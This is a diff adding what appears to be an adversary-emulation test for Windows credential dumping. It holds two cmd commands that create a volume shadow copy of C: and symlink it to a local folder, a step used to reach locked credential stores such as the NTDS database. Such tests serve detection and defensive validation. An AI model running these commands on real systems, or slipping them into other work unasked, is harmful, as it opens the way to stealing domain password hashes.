@@ -1,0 +1,8 @@
+#TechniqueName: OS Credential Dumping: NTDS
+#AtomicTestName: Create Symlink to Volume Shadow Copy
+#Language: cmd
+
+#commands
+vssadmin.exe create shadow /for=C:
+mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
